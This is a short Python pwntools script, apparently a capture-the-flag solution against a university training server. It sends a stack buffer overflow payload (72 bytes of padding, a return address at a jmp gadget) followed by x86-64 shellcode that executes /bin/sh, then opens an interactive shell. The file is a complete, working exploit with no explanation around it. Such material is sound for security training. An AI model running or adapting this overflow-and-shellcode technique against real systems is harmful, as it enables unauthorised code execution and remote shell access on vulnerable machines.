from pwn import *

p = remote('cyberchallenge.disi.unitn.it', 9004)

offset = 72

address = 0x40114a #perche' c'e' il jmp

shellcode =  b"\x48\x31\xd2"                                  # xor    %rdx, %rdx
shellcode += b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      # mov	$0x68732f6e69622f2f, %rbx
shellcode += b"\x48\xc1\xeb\x08"                              # shr    $0x8, %rbx
shellcode += b"\x53"                                          # push   %rbx
shellcode += b"\x48\x89\xe7"                                  # mov    %rsp, %rdi
shellcode += b"\x50"                                          # push   %rax
shellcode += b"\x57"                                          # push   %rdi
shellcode += b"\x48\x89\xe6"                                  # mov    %rsp, %rsi
shellcode += b"\xb0\x3b"                                      # mov    $0x3b, %al
shellcode += b"\x0f\x05";                                     # syscall

payload =b'A'*offset  + p64(address) + shellcode

p.sendline(payload)

p.interactive()